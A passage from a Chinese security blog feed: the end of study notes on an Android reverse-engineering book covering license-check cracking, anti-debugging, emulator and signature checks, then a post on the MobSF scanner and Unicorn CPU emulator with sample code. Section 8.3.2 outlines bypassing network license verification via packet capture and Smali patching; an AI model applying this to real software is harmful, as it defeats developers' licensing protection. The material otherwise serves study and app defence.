网络验证保护思路</h3><p>软件通过网络向验证服务器请求反馈信息，这些信息可能是静态的(例如服务器上的某个文件)，也可能是动态的(例如传递一些特定的参数访问服务器的ASP或PHP脚本，服务器根据不同的参数返回不同的数据)，还有可能是交互的(例如软件定义了一套与服务器交互的协议，通过Socket方式进行通信)。</p><p>对于静态的反馈信息，分析人员能够手动访问网络获取所有信息的内容，这样的软件在破解时相对简单，只需要找到验证点补丁上相应的信息即可。</p><p>动态的反馈信息处理起来则比较麻烦，由于无法得知完整的信息内容，就需要尝试构造不用参数的信息来获取返回结果，这可能需要多次运行软件，并且效果可能并不理想，尤其在参数与反馈信息被加密的情况下，还需要花大量的时间来对信息进行解密。</p><p>交互式的网络验证是最难破解的，交互式网络验证的服务器能够对信息进行更好的控制，这种验证多用于对软件功能的保护以及对软件使用者合法性的检测上，软件功能保护将软件的核心功能从客户端转向了服务端，客户端软件只是成为了一个数据显示工具，而合法性检测例如常见的“心跳包”检测，一旦软件与服务器断开连接，软件就拒绝提供任何功能或者干脆停止运行。</p><h3 id="8-3-2-实例破解——针对网络验证静态方式的破解"><a href="#8-3-2-实例破解——针对网络验证静态方式的破解" class="headerlink" title="8.3.2 实例破解——针对网络验证静态方式的破解"></a>8.3.2 实例破解——针对网络验证静态方式的破解</h3><p>既然软件会联网访问服务器上的数据，那么可以先找出服务器的地址。除了使用静态分析查找服务器地址外，还可以通过网络抓包的方式来获取，网络抓包工具可以使用Android移植版的tcpdump工具，该工具在Android模拟器的<code>system/xbin</code>目录下。</p><p>执行抓包命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell tcpdump -p -vv 0 -w /sdcard/capture.pcap</span><br></pre></td></tr></table></figure><p>导出包文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/capture.pcap</span><br></pre></td></tr></table></figure><p>导出后可用Wireshark查看流量包，筛选出HTTP与TCP数据包，找到网址。</p><p>之后再根据网址的静态内容嵌入到Smali代码中，去掉网络验证即可。（具体实现还没有找到好的例子，以后可能补上）</p><h2 id="8-4-重启验证"><a href="#8-4-重启验证" class="headerlink" title="8.4 重启验证"></a>8.4 重启验证</h2><p>重启验证是一种常见的软件保护技术，它的保护强度与开发人员重启验证的保护思路有关。</p><h3 id="8-4-1-重启验证保护思路"><a href="#8-4-1-重启验证保护思路" class="headerlink" title="8.4.1 重启验证保护思路"></a>8.4.1 重启验证保护思路</h3><p>重启验证的通常做法是：在软件注册时不直接提示注册成功与否，而是将注册信息保存下来，然后在下次启动时读取并验证，如果失败则软件仍未注册，成功则开启注册版的功能。</p><p>Android系统保存信息的方法有限，只能是内部存储、外部存储、数据库与SharedProferences等4种方式。破解者通常可以在短时间内找到注册信息的保存位置，因此，在实际使用重启验证的过程中，注册信息必须要加密存储才能保证其保护强度。几种常见的保护方案如下：</p><ul><li>单一保护。重启验证保护模块使用Java代码编写，注册信息加密保存到内部存储中。</li><li>单一保护。重启验证保护模块使用Native代码编写，注册信息加密保存到内部存储中。</li><li>多重保护。重启验证保护模块使用Native代码编写，并在代码中加入网络验证。</li></ul><h1 id="9-Android程序的反破解技术"><a href="#9-Android程序的反破解技术" class="headerlink" title="9. Android程序的反破解技术"></a>9. Android程序的反破解技术</h1><p>逆向Android程序的整个过程可分为反编译、静态分析、动态调试、重编译4个环节，从这4个环节出发，分析如何在每个环节中保护Android程序。</p><h2 id="9-1-对抗反编译"><a href="#9-1-对抗反编译" class="headerlink" title="9.1 对抗反编译"></a>9.1 对抗反编译</h2><p>对抗反编译是指APK文件无法通过反编译工具(如Apktool、BakSmali、dex2jar)对其进行反编译，或者反编译后无法得到软件正确的反汇编代码。</p><p>对抗反编译工具的思路是：寻找反编译工具在处理APK或DEX文件时的缺陷，然后在自己的软件中加以利用，让反编译工具处理这些“特制”的APK文件时抛出异常而反编译失败。这样编写出来的软件能够在手机上正常使用，但在反编译工具的眼里却是一个“畸形”的文件。</p><p>如何查找反编译工具的缺陷？两种方式：阅读反编译工具源码和压力测试。</p><p><strong>阅读反编译工具源码</strong></p><p>目前大多数Android软件的反汇编工具都是开源的，可以很方便通过阅读源码来查找缺陷。查找的思路可以根据APK文件的处理环节来展开，例如资源文件处理、DEX文件校验、DEX文件类代码解析等。但通常情况下，反编译工具在发布前都经过多次测试，要想找出代码的缺陷非常困难。因此这种方法具体实施起来比较困难。</p><p><strong>压力测试</strong></p><p>收集大量的APK文件存放进一个目录，编写脚本或程序调用反编译工具对目录下的所有APK文件进行反编译。不同的软件从大小、内容到结构组织都不尽相同，反编译工具在处理它们时有可能会出现异常。从反编译的出错信息中查找反编译工具的缺陷，然后在软件开发中加以利用。</p><h2 id="9-2-对抗静态分析"><a href="#9-2-对抗静态分析" class="headerlink" title="9.2 对抗静态分析"></a>9.2 对抗静态分析</h2><h3 id="9-2-1-代码混淆技术"><a href="#9-2-1-代码混淆技术" class="headerlink" title="9.2.1 代码混淆技术"></a>9.2.1 代码混淆技术</h3><p>使用Native代码代替Java代码是很好的代码保护手段，Google在Android 2.3的SDK中正式加入了ProGuard代码混淆工具。</p><p>ProGuard提供了压缩、混淆、优化Java代码以及反混淆栈跟踪的功能。ProGuard默认情况下会对class文件中所有的类、方法以及字段进行混淆，经过混淆的类会面目全非。</p><h3 id="9-2-2-NDK保护"><a href="#9-2-2-NDK保护" class="headerlink" title="9.2.2 NDK保护"></a>9.2.2 NDK保护</h3><p>用Native代码代替Java代码。</p><h3 id="9-2-3-外壳保护"><a href="#9-2-3-外壳保护" class="headerlink" title="9.2.3 外壳保护"></a>9.2.3 外壳保护</h3><p>外壳保护是一种代码加密技术，在Windows平台的软件中广泛被使用。经过外壳保护的软件，展现在分析人员面前的是外壳的代码，因此很大程度上保护了软件被人破解。</p><p>Java代码由于其语言自身的特殊性，没有外壳保护的概念，只能通过混淆方式对其进行保护。外壳保护重点针对使用Android NDK编写的Native代码，逆向Native代码本身就很困难了，再加上外壳保护难上加难。目前已知可用于ARM Linux内核程序的加壳工具只有UPX。</p><h2 id="9-3-对抗动态调试"><a href="#9-3-对抗动态调试" class="headerlink" title="9.3 对抗动态调试"></a>9.3 对抗动态调试</h2><h3 id="9-3-1-检测调试器"><a href="#9-3-1-检测调试器" class="headerlink" title="9.3.1 检测调试器"></a>9.3.1 检测调试器</h3><p>动态调试使用调试器来挂钩软件，获取软件运行时的数据，我们可以在软件中加入检测调试器的代码，当检测到软件被调试器连接时，中止软件的运行。</p><p>在<code>AndroidManifest.xml</code>文件中application标签中加入<code>android:debuggable=&quot;false&quot;</code>让程序不可调试，这样如果别人想调试该程序就必然会修改它的值，我们在代码中检查它的值来判断程序是否被修改过，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((getApplicationInfo().flags &amp;= ApplicationInfo.FLAG_DEBUGGABLE) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    Log.e(<span class="string">&quot;com.droider.antidebug&quot;</span>,<span class="string">&quot;程序被修改为可调试状态&quot;</span>);</span><br><span class="line">    android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ApplicationInfo.FLAG_DEBUGGABLE</code>对应<code>android:debuggable=&quot;true&quot;</code>，如果该标志被置位，说明程序被修改，此时可以果断中止程序运行。</p><p>另外，Android SDK中提供了一个方法方便程序员来检测调试器是否已经连接，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.Debug.isDebuggerContected()</span><br></pre></td></tr></table></figure><p>如果方法返回true，说明调试器已经连接。我们可以随机地在软件中插入这行代码来检测调试器，碰到有调试器连接就果断地结束运行。</p><h3 id="9-3-2-检测模拟器"><a href="#9-3-2-检测模拟器" class="headerlink" title="9.3.2 检测模拟器"></a>9.3.2 检测模拟器</h3><p>软件发布后会安装到用户的手机中运行，如果发现软件运行在模拟器中，很显然不合常理，可能是有人试图破解或分析它。</p><p>模拟器与真机有着许多差异，可以输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop</span><br></pre></td></tr></table></figure><p>查看并对比它们的属性值，经过对比发现，有如下几个属性值可以用来判断软件是否运行在模拟器中：</p><ul><li>ro.product.model：该值在模拟器中为sdk，通常在真机中它的值为手机型号。</li><li>ro.build.tags：该值在模拟器中为test-keys，通常在真机中它的值为release-keys。</li><li>ro.kernel.qemu：该值在模拟器中为1，通常在真机中没有该属性。</li></ul><h2 id="9-4-防止重编译"><a href="#9-4-防止重编译" class="headerlink" title="9.4 防止重编译"></a>9.4 防止重编译</h2><h3 id="9-4-1-检查签名"><a href="#9-4-1-检查签名" class="headerlink" title="9.4.1 检查签名"></a>9.4.1 检查签名</h3><p>破解者通常不可能拥有与开发人员相同的密钥文件（密钥文件被盗除外），因此签名成了Android软件一种有效的身份标识。如果软件运行时的签名与自己发布时的不同，说明软件被篡改过。</p><p>Android SDK中提供了检测软件签名的方法，可以调用PackageManager类的<code>getPackageInfo()</code>方法。由于返回的签名较长，可用其Hash值在代码中进行比较。</p><h3 id="9-4-2-校验保护"><a href="#9-4-2-校验保护" class="headerlink" title="9.4.2 校验保护"></a>9.4.2 校验保护</h3><p>重编译Android软件的实质是重新编译<code>classes.dex</code>文件，代码经过重新编译后，生成的<code>classes.dex</code>文件的Hash值已经改变，我们可以检查程序的安装后<code>classes.dex</code>文件的Hash值来判断软件是否被重打包过。</p><h1 id="10-Android系统攻击与防范"><a href="#10-Android系统攻击与防范" class="headerlink" title="10. Android系统攻击与防范"></a>10. Android系统攻击与防范</h1><h2 id="10-1-Anroid手机ROOT原理"><a href="#10-1-Anroid手机ROOT原理" class="headerlink" title="10.1 Anroid手机ROOT原理"></a>10.1 Anroid手机ROOT原理</h2><p>手机ROOT是通过已经公布的Android系统本地提权漏洞，借助漏洞利用程序来提升系统的用户权限。手机ROOT分为临时ROOT与永久ROOT。临时ROOT是指临时性的获取系统root权限，不对系统进行任何修改，而永久ROOT是指修改Android系统，手机可以随时获取root权限。</p><h2 id="10-2-ROM安全"><a href="#10-2-ROM安全" class="headerlink" title="10.2 ROM安全"></a>10.2 ROM安全</h2><p>ROM，只读存储器。手机ROM指的是存放手机固件代码的存储器，可以理解为手机的“系统”，类似于Windows系统安装光盘。</p><h3 id="10-2-1-ROM的种类"><a href="#10-2-1-ROM的种类" class="headerlink" title="10.2.1 ROM的种类"></a>10.2.1 ROM的种类</h3><p>根据ROM制作者不同，Android系统的ROM分为如下三类：</p><ul><li>官方ROM：手机出厂时被刷入的ROM。</li><li>第三方ROM：由第三方ROM制作团队或厂商制作的ROM。</li><li>民间个人版ROM：个人在官方ROM或第三方ROM的基础上进行修改而成的ROM。</li></ul><h1 id="11-DroidKongFu变种病毒实例分析"><a href="#11-DroidKongFu变种病毒实例分析" class="headerlink" title="11. DroidKongFu变种病毒实例分析"></a>11. DroidKongFu变种病毒实例分析</h1><img src="/posts/d368aa06/11.1.1.jpg" class="" title="DroidKongFu变种病毒执行流程图">]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记是学习看雪“非虫”的《Android软件安全与逆向分析》一书中的内容所写。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Android移动安全相关工具</title>
    <link href="http://example.com/posts/78ecec07.html"/>
    <id>http://example.com/posts/78ecec07.html</id>
    <published>2022-07-28T14:18:08.225Z</published>
    <updated>2022-11-17T06:26:06.801Z</updated>
    
    <content type="html"><![CDATA[<p>没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。</p><span id="more"></span><h1 id="1-MobSF"><a href="#1-MobSF" class="headerlink" title="1. MobSF"></a>1. MobSF</h1><p>MobSF是Mobile Security Framework的缩写，是一个移动端应用安全问题检测的框架和工具，它适用于Android/iOS/Windows，能够执行动态和静态的恶意软件的分析和检测，无论是二进制方式还是压缩的源代码都可以进行检测。静态分析适用于安卓、苹果应用程序，而动态分析暂时只支持安卓应用程序。</p><p>详细安装教程可看官方文档：<a href="https://mobsf.github.io/docs/#/zh-cn/">https://mobsf.github.io/docs/#/zh-cn/</a></p><p>注：Python版本按照上面官方文档下载，安装Python 3.10会出错。</p><p>将APK文件（比如：迅雷安卓移动端）上传到MobSF，并等待它自动分析。分析完成后MobSF后界面如下：</p><img src="/posts/78ecec07/1.1.1.jpg" class="" title="MobSF静态分析界面"><h2 id="1-1-基本信息"><a href="#1-1-基本信息" class="headerlink" title="1.1 基本信息"></a>1.1 基本信息</h2><p>在基本信息那一栏，可以看到该APK的安全得分、文件信息和App信息等。App信息包括了包名和Main Activity等。基本信息中还会给出Activities、Services、Receivers、Providers这四大组件的数目，以及可导出组件的数目。（可导出组件是较为严重的安全漏洞，因此这里单独列出了可导出组件的数目）</p><img src="/posts/78ecec07/1.1.2.jpg" class="" title="基本信息"><h2 id="1-2-扫描信息和反编译代码"><a href="#1-2-扫描信息和反编译代码" class="headerlink" title="1.2 扫描信息和反编译代码"></a>1.2 扫描信息和反编译代码</h2><img src="/posts/78ecec07/1.1.3.jpg" class="" title="扫描信息"><p>可以对APK进行重扫，也可以开始动态分析。动态分析就需要Genymotion模拟器或者真机辅助。点击动态分析，MobSF会将该APK下载至安卓设备中，但目前的APK和真机大多是ARM架构的，所以下载至真机应该没多大问题。但Genymotion是x86架构的，下载ARM架构的APK会导致下载失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] 26/Jul/2022 15:19:56 - This APK cannot be installed. Is this APK compatible the Android VM/Emulator?</span><br><span class="line">adb install failed</span><br><span class="line">[ERROR] 26/Jul/2022 15:19:56 - Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br><span class="line">ERROR:django.request:Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br></pre></td></tr></table></figure><p>解决方法是下载安装转换工具<a href="https://github.com/m9rco/Genymotion_ARM_Translation">Genymotion_ARM_Translation</a>，目前只更新到Android 9.0，所以使用的模拟器安卓版本不能太高。据自己的模拟器系统版本下载对应的ZIP包，然后将包直接拖入到模拟器安装，安装完成后重启模拟器即可。</p><p>在MobSF中连接安卓设备，重新选择动态分析，此时成功下载迅雷，进入动态调试界面。</p><img src="/posts/78ecec07/1.1.4.jpg" class="" title="动态分析"><p>同时在Dynamic Analyzer那一栏可以看到APK在模拟器中的安装路径。</p><img src="/posts/78ecec07/1.1.5.jpg" class="" title="动态分析"><p>呃动态分析好像也是MobSF自动分析的。动态分析主要功能如下：</p><div class="table-container"><table><thead><tr><th>功能菜单</th><th>说明</th></tr></thead><tbody><tr><td>Show/Stop Screen</td><td>开启/关闭屏幕</td></tr><tr><td>Install/Remove MobSF RootCA</td><td>安装/卸载MobSF证书</td></tr><tr><td>Set/Unset HTTP(s) Proxy</td><td>设置/取消HTTP(s)代理</td></tr><tr><td>TLS/SSL Security Tester</td><td>TLS/SSL安全测试</td></tr><tr><td>Exported Activity Tester</td><td>测试导出类型的Activity</td></tr><tr><td>Activity Tester</td><td>测试Activity</td></tr><tr><td>Get Dependencies</td><td>获取依赖项</td></tr><tr><td>Take a Screenshot</td><td>截屏</td></tr><tr><td>Logcat Stream</td><td>日志流信息</td></tr><tr><td>Generate Report</td><td>生成动态分析报告</td></tr></tbody></table></div><p>如果APK比较大，在Activity Tester测试时等待时间会比较漫长。</p><p>在反编译代码那一个框里可以查看并下载App的Java代码，或者查看并下载Smali代码，再或者查看Manifest文件。另外，在这部分中也可以动态分析。</p><h2 id="1-3-签名者证书"><a href="#1-3-签名者证书" class="headerlink" title="1.3 签名者证书"></a>1.3 签名者证书</h2><p>这部分主要说明了对该APK签名的签名者信息。</p><img src="/posts/78ecec07/1.1.6.jpg" class="" title="签名者信息"><h2 id="1-4-权限信息"><a href="#1-4-权限信息" class="headerlink" title="1.4 权限信息"></a>1.4 权限信息</h2><p>在权限信息中，罗列了被检测App在Manifest文件中申请的所有权限，并标出了每个权限的危险指数，对于有安全隐患的权限标记为危险。在每个权限后面都加上了该权限的作用简介，并对其功能及安全风险进行了描述。</p><img src="/posts/78ecec07/1.1.7.jpg" class="" title="权限信息"><p>以android.permission.ACCESS_COARSE_LOCATION为例：</p><p>MobSF检测到App请求了这一权限，这项权限用于获取设备的粗略位置信息。MobSF将其标记为dangerous，即认为这项权限是有安全风险的。在描述中介绍了这一权限的功能，可以通过基站定位等方式获取用户位置，恶意程序可以通过该权限来获取用户的大致位置。</p><h2 id="1-5-安卓API"><a href="#1-5-安卓API" class="headerlink" title="1.5 安卓API"></a>1.5 安卓API</h2><img src="/posts/78ecec07/1.1.8.jpg" class="" title="安卓API"><p>上传为安卓应用时展示，列举了被检测App调用的所有安卓API，并给出了调用API的代码的位置，这一功能在代码研究分析时比较实用，但在安全检测分析中实际作用并不大。</p><h2 id="1-6-Browsable-Activities"><a href="#1-6-Browsable-Activities" class="headerlink" title="1.6 Browsable Activities"></a>1.6 Browsable Activities</h2><p>browsable的意思就是浏览器在特定条件下可以打开用户的activity。（这个不太懂）</p><h2 id="1-7-安全分析"><a href="#1-7-安全分析" class="headerlink" title="1.7 安全分析"></a>1.7 安全分析</h2><p>安全分析是MobSF的最重要部分，分为六个分析点，分别是网络安全、Manifest分析、源码分析、二进制分析、NIAP分析和文件分析。</p><img src="/posts/78ecec07/1.1.9.jpg" class="" title="安全分析"><h1 id="2-Unicorn"><a href="#2-Unicorn" class="headerlink" title="2. Unicorn"></a>2. Unicorn</h1><p>Unicorn基于qemu开发，是一个轻量级、多平台、多架构的CPU模拟器框架，可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集的原生程序，让我们更好地关注CPU操作，忽略机器设备的差异。</p><p>Unicorn安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install unicorn</span><br></pre></td></tr></table></figure><h2 id="2-1-Unicorn的编写"><a href="#2-1-Unicorn的编写" class="headerlink" title="2.1 Unicorn的编写"></a>2.1 Unicorn的编写</h2><p>对于利用Unicorn编写的代码思路一般为：设置好参数-&gt;加载模拟的代码-&gt;添加hook-&gt;run。</p><h3 id="2-1-1-设置参数并加载模拟执行的代码"><a href="#2-1-1-设置参数并加载模拟执行的代码" class="headerlink" title="2.1.1 设置参数并加载模拟执行的代码"></a>2.1.1 设置参数并加载模拟执行的代码</h3><p>头文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment">#调用unicorn库</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment">#我们构造的是x86寄存器，所以还需要使用一些x86寄存器的常量，所以还要调用这个库，同理如果是x64的话就改成unicorn.x64_const</span></span><br></pre></td></tr></table></figure><p>Uc类初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mu = Uc(arch, mode)</span></span><br><span class="line"><span class="comment">#这个Uc类接受两个参数分别是硬件架构(arch)和硬件模式(mode)，在这个样例中我们选用的是X86体系结构和32位代码</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br></pre></td></tr></table></figure><p>arch和mode相关常量有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch:UC_ARCH_ARM、UC_ARCH_ARM64、UC_ARCH_M68K、UC_ARCH_MAX、UC_ARCH_MIPS、UC_ARCH_PPC、UC_ARCH_SPARC、UC_ARCH_X86</span><br><span class="line"></span><br><span class="line">mode:UC_MODE_16、UC_MODE_32、UC_MODE_64、UC_MODE_ARM、UC_MODE_BIG_ENDIAN、UC_MODE_LITTLE_ENDIAN、UC_MODE_MCLASS、UC_MODE_MICRO、UC_MODE_MIPS3、UC_MODE_MIPS32、UC_MODE_MIPS32R6、UC_MODE_MIPS64、UC_MODE_PPC32、UC_MODE_PPC64、UC_MODE_QPX、UC_MODE_SPARC32、UC_MODE_SPARC64、UC_MODE_THUMB、UC_MODE_V8、UC_MODE_V9</span><br></pre></td></tr></table></figure><p>定义虚拟地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADDRESS = <span class="number">0x1000000</span><span class="comment">#注意一定要与0x1000对齐</span></span><br></pre></td></tr></table></figure><p>映射代码内存，所有CPU操作都只能访问此内存，默认权限为rwx。<code>mem_map()</code>函数要求 address 和 size 参数都与0x1000对齐，否则会报UC_ERR_ARG异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">#接受两个参数，分别是地址和大小，要注意地址与大小一定都要是0x1000对齐</span></span><br></pre></td></tr></table></figure><p>把要模拟的代码加载到我们刚刚映射的内存上，<code>mem_write()</code>函数的第二个参数只支持python的byte数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这个有两种实现方式第一种是直接把调试代码写在此代码中，还有一种就是调用此代码外的二进制代码</span></span><br><span class="line"><span class="comment">#第一种:</span></span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span><span class="comment">#这两个x86的指令为“INC ecx”（+1指令）和“DEC edx”（-1指令）</span></span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种:</span></span><br><span class="line">mu.mem_write(ADDRESS, <span class="built_in">open</span>(<span class="string">&#x27;./test&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h3 id="2-1-2-添加指令级的Hook"><a href="#2-1-2-添加指令级的Hook" class="headerlink" title="2.1.2 添加指令级的Hook"></a>2.1.2 添加指令级的Hook</h3><p>这个有点像单步调试的感觉，在begin…end范围内的每一条指令被执行前都会调用callback。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br></pre></td></tr></table></figure><p><code>hook_code()</code>是Python自带的函数，类似于C语言中的<code>printf()</code>。<code>hook_code()</code>用来跟踪指令的，仅打印指令执行的地址和长度信息。实际应用中可配合capstone反汇编引擎玩一些更骚的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># callback for tracing instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br></pre></td></tr></table></figure><p><code>UC_HOOK_CODE</code>的callback中可以修改PC或EIP等寄存器来改变程序运行流程。实际上，Unicorn调试器的单步调试就是以这个为基础实现的。</p><h3 id="2-1-3-启动虚拟机"><a href="#2-1-3-启动虚拟机" class="headerlink" title="2.1.3 启动虚拟机"></a>2.1.3 启动虚拟机</h3><p>我们已经映射内存并将数据写入到内存，并设置好执行Hook以监视指令是否正常执行，但是虚拟机还没有启动，所以需要用<code>emu_start()</code>函数来启动虚拟机。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line"><span class="comment">#这个函数本来是有四个参数的，分别是需要模拟代码的初始地址、结束地址、模拟的时间、模拟的指令数量，我们通常忽略后面两个参数，这样就会在无限的时间中模拟无限数量的指令</span></span><br><span class="line"><span class="comment">#mu.emu_start(self, begin, until, timeout=0, count=0)</span></span><br></pre></td></tr></table></figure><h3 id="2-1-4-获取和修改寄存器内容"><a href="#2-1-4-获取和修改寄存器内容" class="headerlink" title="2.1.4 获取和修改寄存器内容"></a>2.1.4 获取和修改寄存器内容</h3><p>当然对于调试，最重要的就是可以查看和修改寄存器的值，Unicorn也提供了这样的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"><span class="comment">#这个函数接受两个参数，分别是寄存器地址（这个在常量中有）、要写入的内容</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="comment">#这个函数只接受一个参数，那就是寄存器地址，返回这个寄存器的内容</span></span><br></pre></td></tr></table></figure><h3 id="2-1-5-上述样例的完整代码"><a href="#2-1-5-上述样例的完整代码" class="headerlink" title="2.1.5 上述样例的完整代码"></a>2.1.5 上述样例的完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line">    </span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br></pre></td></tr></table></figure><p>运行试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS 